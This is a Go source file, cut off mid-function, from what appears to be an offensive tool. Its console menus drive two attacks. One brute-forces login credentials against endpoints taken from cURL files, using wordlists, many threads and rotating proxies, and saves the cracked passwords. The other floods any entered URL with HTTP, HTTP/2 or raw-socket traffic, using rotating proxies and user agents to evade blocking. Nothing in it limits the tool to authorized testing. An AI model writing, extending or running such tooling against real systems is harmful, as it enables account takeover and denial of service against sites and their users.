package consolemenu

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/letgo/cracker"
	"github.com/letgo/curlparser"
	"github.com/letgo/ddos"
	"github.com/letgo/pathtraversal"
)

// attackWithCurl performs an attack using cURL configuration from a file
func (m *Menu) attackWithCurl() {
	reader := bufio.NewReader(os.Stdin)

	// Ask for cURL file path
	defaultCurlFile := filepath.Join(dataDir, "cURL-Bruteforce.txt")
	fmt.Printf("\nEnter cURL config file path (default: %s): ", defaultCurlFile)
	curlFile, _ := reader.ReadString('\n')
	curlFile = strings.TrimSpace(curlFile)
	if curlFile == "" {
		curlFile = defaultCurlFile
	}

	// Load cURL configurations from file
	curlConfigs, err := curlparser.LoadFromFile(curlFile)
	if err != nil {
		fmt.Printf("Error loading cURL config: %v\n", err)
		fmt.Println("Please make sure the file exists and contains valid cURL commands.")
		fmt.Println("\nExample cURL-Bruteforce.txt format:")
		fmt.Println("  curl -X POST https://example.com/login \\")
		fmt.Println("    -H 'Content-Type: application/json' \\")
		fmt.Println("    -d '{\"username\":\"test\",\"password\":\"test\"}'")
		fmt.Println()
		return
	}

	fmt.Printf("\n✓ Found %d cURL configuration(s)\n\n", len(curlConfigs))

	// Display found configurations
	fmt.Println("===== Found cURL Configurations =====")
	for i, config := range curlConfigs {
		fmt.Printf("[%d] %s %s\n", i+1, config.Method, config.URL)
		if config.ContentType != "" {
			fmt.Printf("    Content-Type: %s\n", config.ContentType)
		}
		if len(config.Headers) > 0 {
			fmt.Printf("    Headers: %d custom header(s)\n", len(config.Headers))
		}
		if config.Data != "" {
			// Extract field names
			usernameField, passwordField, fields := curlparser.ExtractFieldsFromData(config.Data, config.ContentType)
			fmt.Printf("    Detected fields: username='%s', password='%s'\n", usernameField, passwordField)
			if len(fields) > 2 {
				fmt.Printf("    Additional fields: %d\n", len(fields)-2)
			}
		}
		fmt.Println()
	}

	// Ask which config to use
	var selectedConfigs []*curlparser.CurlConfig
	if len(curlConfigs) == 1 {
		selectedConfigs = curlConfigs
		fmt.Println("Using the only available cURL configuration.")
	} else {
		fmt.Print("Choose option:\n")
		fmt.Print("  [1] Select specific configuration\n")
		fmt.Print("  [2] Use all configurations\n")
		fmt.Print("Enter choice (1 or 2): ")
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)

		if choice == "1" {
			fmt.Print("Enter configuration number: ")
			numStr, _ := reader.ReadString('\n')
			num, err := strconv.Atoi(strings.TrimSpace(numStr))
			if err != nil || num < 1 || num > len(curlConfigs) {
				fmt.Println("Invalid configuration number.")
				return
			}
			selectedConfigs = []*curlparser.CurlConfig{curlConfigs[num-1]}
		} else if choice == "2" {
			selectedConfigs = curlConfigs
		} else {
			fmt.Println("Invalid choice.")
			return
		}
	}

	// Get common attack parameters
	fmt.Println("\n===== Attack Configuration =====")

	// Ask if using proxy
	fmt.Print("Use proxy for attacks? (y/n, default: n): ")
	useProxyStr, _ := reader.ReadString('\n')
	useProxyStr = strings.TrimSpace(strings.ToLower(useProxyStr))
	useProxy := useProxyStr == "y" || useProxyStr == "yes"

	var proxyList []string
	var rotateProxy bool
	if useProxy {
		// Load proxies from proxy/proxy.txt
		proxies, err := m.loadValidProxies()
		if err != nil || len(proxies) == 0 {
			proxyPath := filepath.Join(dataDir, "proxy", "proxy.txt")
			fmt.Printf("Warning: No valid proxies found in %s (%v)\n", proxyPath, err)
			fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
			fmt.Print("Continue without proxy? (y/n): ")
			continueStr, _ := reader.ReadString('\n')
			if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
				return
			}
			useProxy = false
		} else {
			proxyList = proxies
			fmt.Printf("✓ Loaded %d valid proxies\n", len(proxyList))

			// Ask if rotate proxies
			fmt.Print("Rotate through proxies for each request? (y/n, default: y): ")
			rotateStr, _ := reader.ReadString('\n')
			rotateStr = strings.TrimSpace(strings.ToLower(rotateStr))
			rotateProxy = rotateStr != "n" && rotateStr != "no"

			if rotateProxy {
				fmt.Println("✓ Proxy rotation enabled")
			} else {
				fmt.Printf("✓ Using single proxy: %s\n", proxyList[0])
			}
		}
	}

	// Ask if using userlist or single username
	fmt.Print("Use userlist file? (y/n, default: n): ")
	useUserlist, _ := reader.ReadString('\n')
	useUserlist = strings.TrimSpace(strings.ToLower(useUserlist))

	var username, userlist string
	if useUserlist == "y" || useUserlist == "yes" {
		defaultUserlist := filepath.Join(dataDir, "users.txt")
		fmt.Printf("Enter Userlist path (default: %s): ", defaultUserlist)
		userlist, _ = reader.ReadString('\n')
		userlist = strings.TrimSpace(userlist)
		if userlist == "" {
			userlist = defaultUserlist
		}
	} else {
		fmt.Print("Enter Username: ")
		username, _ = reader.ReadString('\n')
		username = strings.TrimSpace(username)
		if username == "" {
			fmt.Println("Error: Username is required.")
			return
		}
	}

	defaultWordlist := filepath.Join(dataDir, "passwords.txt")
	fmt.Printf("Enter Wordlist path (default: %s): ", defaultWordlist)
	wordlist, _ := reader.ReadString('\n')
	wordlist = strings.TrimSpace(wordlist)
	if wordlist == "" {
		wordlist = defaultWordlist
	}

	fmt.Print("Enter Max Threads (default: 100): ")
	threadsStr, _ := reader.ReadString('\n')
	threadsStr = strings.TrimSpace(threadsStr)
	maxThreads := 100
	if threadsStr != "" {
		if t, err := strconv.Atoi(threadsStr); err == nil && t > 0 {
			maxThreads = t
		}
	}

	// Optional: Override success/failure detection
	fmt.Print("\nEnter Success HTTP codes (comma-separated, or press Enter for auto-detect): ")
	successCodesStr, _ := reader.ReadString('\n')
	successCodesStr = strings.TrimSpace(successCodesStr)
	var successCodes []int
	if successCodesStr != "" {
		codes := strings.Split(successCodesStr, ",")
		for _, codeStr := range codes {
			if code, err := strconv.Atoi(strings.TrimSpace(codeStr)); err == nil {
				successCodes = append(successCodes, code)
			}
		}
	}

	fmt.Print("Enter Success keywords in response (comma-separated, or press Enter to skip): ")
	successKeywordsStr, _ := reader.ReadString('\n')
	successKeywordsStr = strings.TrimSpace(successKeywordsStr)
	var successKeywords []string
	if successKeywordsStr != "" {
		successKeywords = strings.Split(successKeywordsStr, ",")
		for i := range successKeywords {
			successKeywords[i] = strings.TrimSpace(successKeywords[i])
		}
	}

	fmt.Print("Enter Failure keywords in response (comma-separated, or press Enter to skip): ")
	failureKeywordsStr, _ := reader.ReadString('\n')
	failureKeywordsStr = strings.TrimSpace(failureKeywordsStr)
	var failureKeywords []string
	if failureKeywordsStr != "" {
		failureKeywords = strings.Split(failureKeywordsStr, ",")
		for i := range failureKeywords {
			failureKeywords[i] = strings.TrimSpace(failureKeywords[i])
		}
	}

	// Start attacks
	fmt.Println("\n===== Starting Attacks =====")
	successCount := 0
	totalConfigs := len(selectedConfigs)

	for i, curlConfig := range selectedConfigs {
		fmt.Printf("\n[%d/%d] Attacking: %s %s\n", i+1, totalConfigs, curlConfig.Method, curlConfig.URL)

		// Convert cURL config to attack config
		attackConfig, err := curlConfig.ToAttackConfig()
		if err != nil {
			fmt.Printf("  ✗ Error converting config: %v\n", err)
			continue
		}

		// Apply user-provided parameters
		attackConfig.Username = username
		attackConfig.Userlist = userlist
		attackConfig.Wordlist = wordlist
		attackConfig.MaxThreads = maxThreads
		attackConfig.ShowAttempts = false

		// Apply proxy settings
		// Proxy list is set above
		attackConfig.ProxyList = proxyList
		attackConfig.RotateProxy = rotateProxy

		if len(successCodes) > 0 {
			attackConfig.SuccessCodes = successCodes
		}
		if len(successKeywords) > 0 {
			attackConfig.SuccessKeywords = successKeywords
		}
		if len(failureKeywords) > 0 {
			attackConfig.FailureKeywords = failureKeywords
		}

		// Display configuration details
		fmt.Printf("  → Endpoint: %s\n", attackConfig.Endpoint)
		fmt.Printf("  → Method: %s\n", attackConfig.Method)
		fmt.Printf("  → Content-Type: %s\n", attackConfig.ContentType)
		fmt.Printf("  → Username field: %s\n", attackConfig.UsernameField)
		fmt.Printf("  → Password field: %s\n", attackConfig.PasswordField)
		fmt.Printf("  → Threads: %d, Timeout: %v\n", maxThreads, attackConfig.Timeout)
		if useProxy {
			fmt.Printf("  → Proxy: Enabled (%d proxies, rotation: %v)\n", len(proxyList), rotateProxy)
		}
		if len(attackConfig.CustomHeaders) > 0 {
			fmt.Printf("  → Custom headers: %d\n", len(attackConfig.CustomHeaders))
		}

		// Create password cracker
		pc := cracker.New(*attackConfig)

		// Load userlist
		if err := pc.LoadUserlist(); err != nil {
			fmt.Printf("  ✗ Error loading userlist: %v\n", err)
			continue
		}

		// Load wordlist
		if err := pc.LoadWordlist(); err != nil {
			fmt.Printf("  ✗ Error loading wordlist: %v\n", err)
			continue
		}

		// Calculate total combinations and warn if too large
		totalUsers := len(pc.GetUserlist())
		totalPasswords := len(pc.GetWordlist())
		totalCombinations := totalUsers * totalPasswords

		if userlist != "" {
			fmt.Printf("  → Testing %d users with %d passwords (%d total combinations)\n", totalUsers, totalPasswords, totalCombinations)
		} else {
			fmt.Printf("  → Testing 1 user with %d passwords\n", totalPasswords)
		}

		// Warn for large attacks
		if totalCombinations > 100000 {
			estimatedTime := float64(totalCombinations) / 1000.0 / 60.0 // Rough estimate at 1000/s
			fmt.Printf("  ⚠ WARNING: Large attack size! Estimated time: %.1f minutes\n", estimatedTime)
			fmt.Print("  Continue? (y/n): ")
			confirm, _ := reader.ReadString('\n')
			if strings.TrimSpace(strings.ToLower(confirm)) != "y" {
				fmt.Println("  Attack cancelled.")
				continue
			}
		}

		// Start attack
		found, credentials := pc.Start()

		if found {
			fmt.Printf("  ✓ Credentials found: %s\n", credentials)
			// Parse username:password
			parts := strings.SplitN(credentials, ":", 2)
			foundUsername := username
			foundPassword := credentials
			if len(parts) == 2 {
				foundUsername = parts[0]
				foundPassword = parts[1]
			}
			// Write result to file
			if err := m.writeResult(curlConfig.URL, foundUsername, foundPassword); err != nil {
				fmt.Printf("  ⚠ Warning: Failed to write result to file: %v\n", err)
			} else {
				resultsPath := filepath.Join(dataDir, "results.txt")
				fmt.Printf("  ✓ Result saved to %s\n", resultsPath)
			}
			successCount++
		} else {
			fmt.Printf("  ✗ Password not found.\n")
		}
	}

	// Summary
	fmt.Println("\n===== Attack Summary =====")
	fmt.Printf("Total configurations attacked: %d\n", totalConfigs)
	fmt.Printf("Successful credentials found: %d\n", successCount)
	if successCount > 0 {
		resultsPath := filepath.Join(dataDir, "results.txt")
		fmt.Printf("Results saved to %s\n", resultsPath)
	}
	fmt.Println()
}

// ddosAttack performs a DDoS attack using cURL configuration from a file
func (m *Menu) ddosAttack() {
	reader := bufio.NewReader(os.Stdin)

	// Ask user to choose configuration method
	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Println("                    DDoS ATTACK SETUP")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Println("\nChoose configuration method:")
	fmt.Println("  [1] Quick Start (Recommended) - Auto-configured for best performance")
	fmt.Println("  [2] Custom                   - Full manual configuration")
	fmt.Print("Enter choice (1-2, default: 1): ")
	configChoice, _ := reader.ReadString('\n')
	configChoice = strings.TrimSpace(configChoice)
	if configChoice == "" {
		configChoice = "1" // Default to Quick Start
	}

	var selectedConfigs []*ddos.DDoSConfig
	var useQuickStart bool

	if configChoice == "1" {
		// Quick Start mode
		useQuickStart = true
	}

	// Simple URL input (replaces cURL file loading)
	fmt.Println("\n===== Target Configuration =====")
	fmt.Print("Enter target URL (e.g., https://example.com/api/endpoint): ")
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)
	if targetURL == "" {
		fmt.Println("Error: Target URL is required.")
		return
	}

	// Ensure URL has protocol
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
		fmt.Printf("✓ Added https:// prefix: %s\n", targetURL)
	}

	// Ask for HTTP method
	fmt.Print("Enter HTTP method (GET/POST/PUT/DELETE, default: GET): ")
	method, _ := reader.ReadString('\n')
	method = strings.TrimSpace(strings.ToUpper(method))
	if method == "" {
		method = "GET"
	}

	// Ask for optional body
	var body string
	if method == "POST" || method == "PUT" {
		fmt.Print("Enter request body (or press Enter to skip): ")
		bodyInput, _ := reader.ReadString('\n')
		body = strings.TrimSpace(bodyInput)
	}

	// Create base config
	baseConfig := ddos.DDoSConfig{
		TargetURL:  targetURL,
		Method:     method,
		Headers:    make(map[string]string),
		Body:       body,
		MaxThreads: 500,
		Duration:   60 * time.Second,
		Timeout:    5 * time.Second,
		AttackMode: ddos.ModeFlood,
	}

	// Auto-detect optimal attack mode if Quick Start
	if useQuickStart {
		info := ddos.DetectTargetCapabilities(targetURL, len(baseConfig.ProxyList))
		baseConfig.AttackMode = ddos.SuggestOptimalAttackMode(info)
		fmt.Printf("✓ Auto-detected attack mode: %s\n", baseConfig.AttackMode)
	}

	selectedConfigs = []*ddos.DDoSConfig{&baseConfig}

	// Config is already created above with simple URL input

	// Apply Quick Start or Preset if selected
	if useQuickStart {
		fmt.Println("\n✓ Quick Start Mode - Auto-detecting optimal settings...")
		
		// Auto-load proxies from default file (enabled by default)
		proxies, err := m.loadValidProxies()
		if err == nil && len(proxies) > 0 {
			for i := range selectedConfigs {
				selectedConfigs[i].ProxyList = proxies
				selectedConfigs[i].RotateProxy = true
			}
			fmt.Printf("✓ Auto-loaded %d proxies from proxy.txt (enabled by default)\n", len(proxies))
		} else {
			fmt.Println("⚠ No proxies found in proxy.txt - continuing without proxies")
		}

		// Auto-load user agents from default file (enabled by default)
		userAgentPath := filepath.Join(dataDir, "user-agent.txt")
		if _, err := os.Stat(userAgentPath); err == nil {
			for i := range selectedConfigs {
				selectedConfigs[i].UserAgentFile = userAgentPath
			}
			fmt.Printf("✓ Auto-loaded user agents from user-agent.txt (enabled by default)\n")
		} else {
			fmt.Println("✓ Using built-in user agents (user-agent.txt not found)")
		}

		for i, config := range selectedConfigs {
			// Auto-detect optimal settings
			optimizedConfig := ddos.AutoDetectOptimalSettings(*config)
			selectedConfigs[i] = optimizedConfig
		}
		// Show detected settings
		if len(selectedConfigs) > 0 {
			fmt.Println("\n===== Auto-Detected Settings =====")
			fmt.Printf("Attack Mode: %s\n", selectedConfigs[0].AttackMode)
			fmt.Printf("Max Threads: %d\n", selectedConfigs[0].MaxThreads)
			if len(selectedConfigs[0].ProxyList) > 0 {
				fmt.Printf("Proxies: %d loaded (rotation enabled)\n", len(selectedConfigs[0].ProxyList))
			}
			if selectedConfigs[0].UserAgentFile != "" {
				fmt.Printf("User Agents: Custom file (%s)\n", selectedConfigs[0].UserAgentFile)
			} else {
				fmt.Println("User Agents: Built-in (rotated)")
			}
			fmt.Println("All efficiency features are enabled by default:")
			fmt.Println("  - Connection pooling")
			fmt.Println("  - Fire-and-forget requests")
			fmt.Println("  - Response body skipping")
			fmt.Println("  - Request randomization")
		}
		fmt.Print("\nPress Enter to start attack (or 'n' to cancel): ")
		confirm, _ := reader.ReadString('\n')
		if strings.TrimSpace(strings.ToLower(confirm)) == "n" {
			return
		}
		// Skip the summary confirmation for quick start - launch immediately
		goto startAttack
	} else {
		// Manual configuration mode
		fmt.Println("\n===== DDoS Configuration =====")

		// Auto-load proxies from default file (enabled by default)
		var proxyList []string
		var rotateProxy bool
		proxies, err := m.loadValidProxies()
		if err == nil && len(proxies) > 0 {
			proxyList = proxies
			rotateProxy = true // Default to rotation enabled
			fmt.Printf("✓ Auto-loaded %d proxies from proxy.txt (enabled by default)\n", len(proxyList))
		} else {
			proxyPath := filepath.Join(dataDir, "proxy", "proxy.txt")
			fmt.Printf("⚠ No valid proxies found in %s (%v)\n", proxyPath, err)
			fmt.Println("Continuing without proxies...")
		}

		// Attack Mode (simplified to 3 modes)
		fmt.Println("\nSelect Attack Mode:")
		fmt.Println("  [1] HTTP Flood - Maximum concurrent HTTP requests (Default, most efficient)")
		fmt.Println("  [2] HTTP/2     - Flood with HTTP/2 streams (HTTPS targets)")
		fmt.Println("  [3] Raw Socket - Maximum throughput using raw TCP (HTTP targets)")
		fmt.Print("Enter choice (1-3, default: 1): ")
		modeChoice, _ := reader.ReadString('\n')
		modeChoice = strings.TrimSpace(modeChoice)

		var attackMode ddos.AttackMode
		switch modeChoice {
		case "2":
			attackMode = ddos.ModeHTTP2
			fmt.Println("✓ HTTP/2 mode selected")
		case "3":
			attackMode = ddos.ModeRaw
			fmt.Println("✓ Raw Socket mode selected")
		default:
			attackMode = ddos.ModeFlood
			fmt.Println("✓ HTTP Flood mode selected")
		}

		// Attack mode is set above, no additional TLS config needed

		// Number of threads
		fmt.Print("\nEnter number of threads (default: 500): ")
		threadsStr, _ := reader.ReadString('\n')
		threadsStr = strings.TrimSpace(threadsStr)
		maxThreads := 500
		if threadsStr != "" {
			if t, err := strconv.Atoi(threadsStr); err == nil && t > 0 {
				maxThreads = t
			}
		}

		// Duration
		fmt.Print("Enter attack duration in seconds (default: 60): ")
		durationStr, _ := reader.ReadString('\n')
		durationStr = strings.TrimSpace(durationStr)
		duration := 60 * time.Second
		if durationStr != "" {
			if d, err := strconv.Atoi(durationStr); err == nil && d > 0 {
				duration = time.Duration(d) * time.Second
			}
		}

		// Rate limit
		fmt.Print("Enter rate limit (requests/sec, 0 = unlimited, default: 0): ")
		rateLimitStr, _ := reader.ReadString('\n')
		rateLimitStr = strings.TrimSpace(rateLimitStr)
		rateLimit := 0
		if rateLimitStr != "" {
			if r, err := strconv.Atoi(rateLimitStr); err == nil && r >= 0 {
				rateLimit = r
			}
		}

		// Auto-load user agents from default file (enabled by default)
		userAgentPath := filepath.Join(dataDir, "user-agent.txt")
		if _, err := os.Stat(userAgentPath); err == nil {
			baseConfig.UserAgentFile = userAgentPath
			fmt.Printf("✓ Auto-loaded user agents from user-agent.txt (enabled by default)\n")
		} else {
			fmt.Println("✓ Using built-in user agents (user-agent.txt not found)")
		}

		// Connection reuse is always enabled (no config needed)

		// HTTP/2 Support (for flood mode)
		var useHTTP2 bool
		if attackMode == ddos.ModeFlood {
			fmt.Print("Enable HTTP/2 support? (y/n, default: n): ")
			http2Str, _ := reader.ReadString('\n')
			http2Str = strings.TrimSpace(strings.ToLower(http2Str))
			useHTTP2 = http2Str == "y" || http2Str == "yes"
			if useHTTP2 {
				fmt.Println("✓ HTTP/2 support enabled (requires HTTPS)")
			}
		}

		// Adaptive Rate Limiting
		var adaptiveRateLimit bool
		if rateLimit > 0 {
			fmt.Print("Use adaptive rate limiting? (y/n, default: n): ")
			adaptiveStr, _ := reader.ReadString('\n')
			adaptiveStr = strings.TrimSpace(strings.ToLower(adaptiveStr))
			adaptiveRateLimit = adaptiveStr == "y" || adaptiveStr == "yes"
			if adaptiveRateLimit {
				fmt.Println("✓ Adaptive rate limiting enabled - will adjust rate based on server response")
			}
		}

		// RUDY mode removed - no longer supported

		// HTTP/2 settings
		var maxStreamsPerConn int
		if attackMode == ddos.ModeHTTP2 {
			fmt.Print("Enter max streams per connection (default: 100): ")
			streamsStr, _ := reader.ReadString('\n')
			streamsStr = strings.TrimSpace(streamsStr)
			maxStreamsPerConn = 100
			if streamsStr != "" {
				if s, err := strconv.Atoi(streamsStr); err == nil && s > 0 {
					maxStreamsPerConn = s
				}
			}
			fmt.Printf("✓ Max streams per connection: %d\n", maxStreamsPerConn)
		}

		// Timeout
		fmt.Print("Enter request timeout in seconds (default: 5): ")
		timeoutStr, _ := reader.ReadString('\n')
		timeoutStr = strings.TrimSpace(timeoutStr)
		timeout := 5 * time.Second
		if timeoutStr != "" {
			if t, err := strconv.Atoi(timeoutStr); err == nil && t > 0 {
				timeout = time.Duration(t) * time.Second
			}
		}

		// Apply configuration to all selected configs
		for _, config := range selectedConfigs {
			config.AttackMode = attackMode
			config.MaxThreads = maxThreads
			config.Duration = duration
			config.RateLimit = rateLimit
			config.Timeout = timeout
			// Apply proxy settings
			config.ProxyList = proxyList
			config.RotateProxy = rotateProxy
			// Apply user agent settings (from baseConfig)
			config.UserAgentFile = baseConfig.UserAgentFile
			// Apply HTTP/2 settings
			config.MaxStreamsPerConn = maxStreamsPerConn
		}
	} // End of manual configuration mode

	// Summary before starting (only for custom mode)
	if !useQuickStart {
		fmt.Println("\n" + strings.Repeat("=", 70))
		fmt.Println("                    ATTACK CONFIGURATION SUMMARY")
		fmt.Println(strings.Repeat("=", 70))
		fmt.Printf("Targets:           %d\n", len(selectedConfigs))
		firstConfig := selectedConfigs[0]
		fmt.Printf("Attack Mode:       %s\n", firstConfig.AttackMode)
		fmt.Printf("Threads:           %d\n", firstConfig.MaxThreads)
		fmt.Printf("Duration:          %s\n", firstConfig.Duration)
		if firstConfig.RateLimit > 0 {
			fmt.Printf("Rate Limit:        %d req/s\n", firstConfig.RateLimit)
		} else {
			fmt.Printf("Rate Limit:        Unlimited\n")
		}
		fmt.Printf("Request Timeout:   %s\n", firstConfig.Timeout)
		if firstConfig.UserAgentFile != "" {
			fmt.Printf("User Agents:       Custom (from %s)\n", firstConfig.UserAgentFile)
		} else {
			fmt.Printf("User Agents:       Built-in (always rotated)\n")
		}
		if len(firstConfig.ProxyList) > 0 {
			fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v, source: proxy.txt)\n", len(firstConfig.ProxyList), firstConfig.RotateProxy)
		} else {
			fmt.Printf("Proxy:             Disabled\n")
		}
		// Deprecated modes and settings removed (simplified)
		if firstConfig.AttackMode == ddos.ModeHTTP2 {
			fmt.Printf("Max Streams/Conn:   %d\n", firstConfig.MaxStreamsPerConn)
		}
		fmt.Println(strings.Repeat("=", 70))

		// Final confirmation
		fmt.Print("\nStart DDoS attack? (y/n): ")
		startConfirm, _ := reader.ReadString('\n')
		startConfirm = strings.TrimSpace(strings.ToLower(startConfirm))
		if startConfirm != "y" {
			fmt.Println("Attack cancelled.")
			return
		}
	}

startAttack:
	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start attacks
	fmt.Println("\n" + strings.Repeat("=", 70))
	fmt.Println("                    DDoS ATTACK IN PROGRESS")
	fmt.Println(strings.Repeat("=", 70))
	
	// Display configuration summary for quick start mode
	firstConfig := selectedConfigs[0]
	if useQuickStart {
		fmt.Println("\n                    ATTACK CONFIGURATION SUMMARY")
		fmt.Println(strings.Repeat("=", 70))
		fmt.Printf("Targets:           %d\n", len(selectedConfigs))
		fmt.Printf("Attack Mode:       %s\n", firstConfig.AttackMode)
		fmt.Printf("Threads:           %d\n", firstConfig.MaxThreads)
		fmt.Printf("Duration:          %s\n", firstConfig.Duration)
		if firstConfig.RateLimit > 0 {
			fmt.Printf("Rate Limit:        %d req/s\n", firstConfig.RateLimit)
		} else {
			fmt.Printf("Rate Limit:        Unlimited\n")
		}
		fmt.Printf("Request Timeout:   %s\n", firstConfig.Timeout)
		if firstConfig.UserAgentFile != "" {
			fmt.Printf("User Agents:       Custom (from %s)\n", firstConfig.UserAgentFile)
		} else {
			fmt.Printf("User Agents:       Built-in (always rotated)\n")
		}
		if len(firstConfig.ProxyList) > 0 {
			fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v, source: proxy.txt)\n", len(firstConfig.ProxyList), firstConfig.RotateProxy)
		} else {
			fmt.Printf("Proxy:             Disabled\n")
		}
		if firstConfig.AttackMode == ddos.ModeHTTP2 {
			fmt.Printf("Max Streams/Conn:   %d\n", firstConfig.MaxStreamsPerConn)
		}
		fmt.Println(strings.Repeat("=", 70))
	}
	
	fmt.Println("\nPress Ctrl+C to stop the attack...")
	fmt.Println()

	var attacks []*ddos.DDoSAttack
	var wg sync.WaitGroup

	// Progress display
	progressMutex := sync.Mutex{}
	lastStats := make(map[int]ddos.AttackStats)

	for i, config := range selectedConfigs {
		// Create progress callback
		idx := i
		config.OnProgress = func(stats ddos.AttackStats) {
			progressMutex.Lock()
			lastStats[idx] = stats
			progressMutex.Unlock()
		}

		attack := ddos.New(*config)
		attacks = append(attacks, attack)

		wg.Add(1)
		go func(a *ddos.DDoSAttack) {
			defer wg.Done()
			if err := a.Start(ctx); err != nil {
				fmt.Printf("Error starting attack: %v\n", err)
				return
			}
			a.Wait()
		}(attack)
	}

	// Display progress in real-time
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				progressMutex.Lock()
				// Clear previous output and display stats
				fmt.Print("\r\033[K") // Clear line

				var totalSent, totalSuccess, totalFailed int64
				var totalRPS float64
				var totalActiveProxies, totalDisabledProxies int

				for _, stats := range lastStats {
					totalSent += stats.RequestsSent
					totalSuccess += stats.RequestsSuccess
					totalFailed += stats.RequestsFailed
					totalRPS += stats.RequestsPerSec
					totalActiveProxies += stats.ActiveProxies
					totalDisabledProxies += stats.DisabledProxies
				}

				if len(lastStats) > 0 {
					elapsed := time.Duration(0)
					for _, stats := range lastStats {
						if stats.ElapsedTime > elapsed {
							elapsed = stats.ElapsedTime
						}
					}
					remaining := firstConfig.Duration - elapsed
					if remaining < 0 {
						remaining = 0
					}

					proxyInfo := ""
					if len(firstConfig.ProxyList) > 0 {
						proxyInfo = fmt.Sprintf(" | Proxies (active/disabled): %d/%d", totalActiveProxies, totalDisabledProxies)
					}

					fmt.Printf("⏱  Elapsed: %s | Remaining: %s | Sent: %d | Success: %d | Failed: %d | RPS: %.0f%s",
						ddos.FormatDuration(elapsed),
						ddos.FormatDuration(remaining),
						totalSent,
						totalSuccess,
						totalFailed,
						totalRPS,
						proxyInfo)
				}
				progressMutex.Unlock()
			}
		}
	}()

	// Wait for all attacks to complete
	wg.Wait()

	// Final stats
	fmt.Println("\n\n" + strings.Repeat("=", 70))
	fmt.Println("                    ATTACK COMPLETE")
	fmt.Println(strings.Repeat("=", 70))

	var grandTotal ddos.AttackStats
	for i, attack := range attacks {
		stats := attack.GetStats()
		grandTotal.RequestsSent += stats.RequestsSent
		grandTotal.RequestsSuccess += stats.RequestsSuccess
		grandTotal.RequestsFailed += stats.RequestsFailed
		grandTotal.BytesSent += stats.BytesSent
		grandTotal.BytesReceived += stats.BytesReceived

		fmt.Printf("\n[Target %d] %s %s\n", i+1, selectedConfigs[i].Method, selectedConfigs[i].TargetURL)
		fmt.Printf("  Requests Sent:     %d\n", stats.RequestsSent)
		fmt.Printf("  Successful:        %d\n", stats.RequestsSuccess)
		fmt.Printf("  Failed:            %d\n", stats.RequestsFailed)
		fmt.Printf("  Data Sent:         %s\n", ddos.FormatBytes(stats.BytesSent))
		fmt.Printf("  Data Received:     %s\n", ddos.FormatBytes(stats.BytesReceived))
		fmt.Printf("  Avg Response Time: %s\n", stats.AvgResponseTime)
		fmt.Printf("  Requests/sec:      %.2f\n", stats.RequestsPerSec)
		if len(selectedConfigs[i].ProxyList) > 0 {
			fmt.Printf("  Proxies Active:    %d\n", stats.ActiveProxies)
			fmt.Printf("  Proxies Disabled:  %d\n", stats.DisabledProxies)
		}
	}

	if len(attacks) > 1 {
		fmt.Println("\n" + strings.Repeat("-", 70))
		fmt.Println("GRAND TOTAL:")
		fmt.Printf("  Total Requests:    %d\n", grandTotal.RequestsSent)
		fmt.Printf("  Total Successful:  %d\n", grandTotal.RequestsSuccess)
		fmt.Printf("  Total Failed:      %d\n", grandTotal.RequestsFailed)
		fmt.Printf("  Total Data Sent:   %s\n", ddos.FormatBytes(grandTotal.BytesSent))
		fmt.Printf("  Total Data Recv:   %s\n", ddos.FormatBytes(grandTotal.BytesReceived))
	}

	fmt.Println(strings.Repeat("=", 70))
	fmt.Println()
}

// editDDoSConfig allows user to edit specific DDoS configuration parameters
func (m *Menu) editDDoSConfig(config *ddos.DDoSConfig, reader *bufio.Reader) *ddos.DDoSConfig {
	fmt.Println("\n===== Edit Configuration =====")
	fmt.Println("Which parameter would you like to edit?")
	fmt.Println("  [1] Target URL")
	fmt.Println("  [2] HTTP Method")
	fmt.Println("  [3] Number of Threads")
	fmt.Println("  [4] Attack Duration (seconds)")
	fmt.Println("  [5] Rate Limit (requests/sec)")
	fmt.Println("  [6] Timeout (seconds)")
	fmt.Println("  [7] Done editing")
	fmt.Print("Enter choice (1-7): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		fmt.Print("Enter new target URL: ")
		url, _ := reader.ReadString('\n')
		config.TargetURL = strings.TrimSpace(url)
		fmt.Println("✓ Target URL updated")
		return m.editDDoSConfig(config, reader) // Allow editing more parameters

	case "2":
		fmt.Print("Enter HTTP method (GET, POST, PUT, etc.): ")
		method, _ := reader.ReadString('\n')
		config.Method = strings.ToUpper(strings.TrimSpace(method))
		fmt.Println("✓ HTTP method updated")
		return m.editDDoSConfig(config, reader)

	case "3":
		fmt.Print("Enter number of threads: ")
		threadsStr, _ := reader.ReadString('\n')
		if t, err := strconv.Atoi(strings.TrimSpace(threadsStr)); err == nil && t > 0 {
			config.MaxThreads = t
			fmt.Println("✓ Threads updated")
		}
		return m.editDDoSConfig(config, reader)

	case "4":
		fmt.Print("Enter attack duration in seconds: ")
		durationStr, _ := reader.ReadString('\n')
		if d, err := strconv.Atoi(strings.TrimSpace(durationStr)); err == nil && d > 0 {
			config.Duration = time.Duration(d) * time.Second
			fmt.Println("✓ Duration updated")
		}
		return m.editDDoSConfig(config, reader)

	case "5":
		fmt.Print("Enter rate limit (requests/sec, 0 = unlimited): ")
		rateStr, _ := reader.ReadString('\n')
		if r, err := strconv.Atoi(strings.TrimSpace(rateStr)); err == nil && r >= 0 {
			config.RateLimit = r
			fmt.Println("✓ Rate limit updated")
		}
		return m.editDDoSConfig(config, reader)

	case "6":
		fmt.Print("Enter timeout in seconds: ")
		timeoutStr, _ := reader.ReadString('\n')
		if t, err := strconv.Atoi(strings.TrimSpace(timeoutStr)); err == nil && t > 0 {
			config.Timeout = time.Duration(t) * time.Second
			fmt.Println("✓ Timeout updated")
